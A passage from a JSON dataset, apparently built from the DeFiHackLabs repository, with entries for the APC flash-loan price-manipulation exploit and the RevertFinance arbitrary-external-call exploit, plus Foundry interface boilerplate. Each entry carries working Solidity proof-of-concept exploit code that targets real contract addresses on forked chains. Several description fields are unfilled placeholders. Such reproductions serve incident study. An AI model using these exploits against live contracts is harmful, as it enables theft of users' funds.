                        "content": "interface IPancakeRouter {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  receive() external payable;\n}\n",
                        "token_count": 1170,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "ade946fb48",
        "is_ready": false,
        "content": "### 20221201 - APC - FlashLoan & price manipulation\n### Lost: $6k\n#### Contract\n[APC_exp.sol](src/test/APC_exp.sol)\n#### Link reference\nhttps://twitter.com/BlockSecTeam/status/1598262002010378241",
        "date": "20221201",
        "target": "APC",
        "attack_title": "FlashLoan & price manipulation",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BlockSecTeam/status/1598262002010378241",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/APC_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1598262002010378241\n// @TX\ninterface TransparentUpgradeableProxy{\n    function swap(address a1, address a2, uint256 amount) external;\n}\ncontract ContractTest is DSTest{\n    IERC20 APC = IERC20(0x2AA504586d6CaB3C59Fa629f74c586d78b93A025);\n    IERC20 MUSD = IERC20(0x473C33C55bE10bB53D81fe45173fcc444143a13e);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    TransparentUpgradeableProxy transSwap = TransparentUpgradeableProxy(0x5a88114F02bfFb04a9A13a776f592547B3080237);\n    address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23527906);\n    }\n    function testExploit() public{\n        APC.approve(address(Router), type(uint).max);\n        APC.approve(address(transSwap), type(uint).max);\n        USDT.approve(address(Router), type(uint).max);\n        MUSD.approve(address(transSwap), type(uint).max);\n        DVM(dodo).flashLoan(0, 500_000 * 1e18, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18);\n    }\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{\n        USDTToAPC(); // Pump APC token price\n        transSwap.swap(address(APC), address(MUSD), 100_000 * 1e18); // APC swap to MUSD with incorrect price, get more MUSD\n        APCToUSDT(); // Dump APC token price\n        transSwap.swap(address(MUSD), address(APC), MUSD.balanceOf(address(this))); // MUSD swap to APC with normal price\n        APCToUSDT(); // sell the obtained of APC\n        USDT.transfer(dodo, 500_000 * 1e18);\n    }\n    function USDTToAPC() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(APC);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(USDT.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n    function APCToUSDT() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(APC);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(APC.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n}",
                "token_count": 796,
                "interfaces": [
                    {
                        "name": "TransparentUpgradeableProxy",
                        "content": "interface TransparentUpgradeableProxy{\n    function swap(address a1, address a2, uint256 amount) external;\n}\n",
                        "token_count": 24,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "d042eb191f",
        "is_ready": false,
        "content": "### 20230218 - RevertFinance - Arbitrary External Call Vulnerability\n### Lost: ~$30k\n#### Contract\n[RevertFinance_exp.sol](src/test/RevertFinance_exp.sol)\n#### Link Reference\nhttps://mirror.xyz/revertfinance.eth/3sdpQ3v9vEKiOjaHXUi3TdEfhleAXXlAEWeODrRHJtU",
        "date": "20230218",
        "target": "RevertFinance",
        "attack_title": "Arbitrary External Call Vulnerability",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://mirror.xyz/revertfinance.eth/3sdpQ3v9vEKiOjaHXUi3TdEfhleAXXlAEWeODrRHJtU",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/RevertFinance_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://mirror.xyz/revertfinance.eth/3sdpQ3v9vEKiOjaHXUi3TdEfhleAXXlAEWeODrRHJtU\n// @TX\n// https://etherscan.io/tx/0xdaccbc437cb07427394704fbcc8366589ffccf974ec6524f3483844b043f31d5\ninterface V3Utils {\n    struct SwapParams {\n        address tokenIn;\n        address tokenOut;\n        uint256 amountIn;\n        uint256 minAmountOut;\n        address recipient; // recipient of tokenOut and leftover tokenIn (if any leftover)\n        bytes swapData;\n        bool unwrap; // if tokenIn or tokenOut is WETH - unwrap\n    }\n    function swap(SwapParams calldata params) external;\n}\ncontract ContractTest is Test {\n    V3Utils utils = V3Utils(0x531110418d8591C92e9cBBFC722Db8FFb604FAFD);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    address[] victims = [0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, 0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2];\n    uint256 counter;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_653_389);\n        cheats.label(address(utils), \"utils\");\n        cheats.label(address(USDC), \"USDC\");\n    }\n    function testExploit() external {\n        for (uint256 i; i < victims.length; ++i) {\n            uint256 transferAmount = USDC.balanceOf(victims[i]);\n            if (USDC.allowance(victims[i], address(utils)) < transferAmount) {\n                transferAmount = USDC.allowance(victims[i], address(utils));\n                if (transferAmount == 0) continue;\n            }\n            bytes memory data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victims[i], address(this), transferAmount);\n            bytes memory swapdata = abi.encode(address(USDC), address(this), data);\n            V3Utils.SwapParams memory params = V3Utils.SwapParams({\n                tokenIn: address(this),\n                tokenOut: address(this),\n                amountIn: 1,\n                minAmountOut: 0,\n                recipient: address(this),\n                swapData: swapdata,\n                unwrap: false\n            });\n            utils.swap(params);\n            counter--;\n        }\n        emit log_named_decimal_uint(\"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals());\n    }\n    function transferFrom(address from, address to, uint256 value) external returns (bool) {\n        counter++;\n        return true;\n    }\n    function approve(address spender, uint256 value) external returns (bool) {\n        return true;\n    }\n    function transfer(address to, uint256 value) external returns (bool) {\n        return true;\n    }\n    function balanceOf(address owner) external view returns (uint256) {\n        if (counter == 1) return 1;\n        else return 0;\n    }\n}",
                "token_count": 793,
                "interfaces": [
                    {
                        "name": "V3Utils",
                        "content": "interface V3Utils {\n    struct SwapParams {\n        address tokenIn;\n        address tokenOut;\n        uint256 amountIn;\n        uint256 minAmountOut;\n        address recipient; // recipient of tokenOut and leftover tokenIn (if any leftover)\n        bytes swapData;\n        bool unwrap; // if tokenIn or tokenOut is WETH - unwrap\n    }\n\n    function swap(SwapParams calldata params) external;\n}\n",
                        "token_count": 88,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth 